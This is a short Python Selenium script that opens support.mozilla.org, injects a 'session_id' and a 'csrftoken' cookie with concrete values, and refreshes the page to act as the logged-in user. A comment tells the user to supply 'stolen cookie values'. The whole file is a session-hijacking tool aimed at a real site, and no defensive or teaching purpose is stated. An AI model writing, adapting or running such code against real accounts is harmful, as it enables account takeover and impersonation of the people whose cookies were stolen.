from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time

chrome_options = Options()
chrome_options.add_argument("--start-maximized")

service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=chrome_options)

# Step 1: Open the base URL to set the domain context for cookies
driver.get('https://support.mozilla.org/')

# Step 2: Add cookies (replace with your stolen cookie values)
cookies = [
    {'name': 'session_id', 'value': 'iiv0krhcgeksxaeq2mc3n8vybgimdb96', 'domain': 'support.mozilla.org', 'path': '/'},
    {'name': 'csrftoken', 'value': '4Btngu6EjuEw8BbCtTLw9zw5IDsPOVyB', 'domain': 'support.mozilla.org', 'path': '/'}
]

for cookie in cookies:
    driver.add_cookie(cookie)

# Step 3: Refresh the page to apply cookies and simulate logged-in session
driver.refresh()

# Now you can interact with the site as the logged-in user
time.sleep(50)  # Keep browser open for 50 seconds to inspect manually

driver.quit()
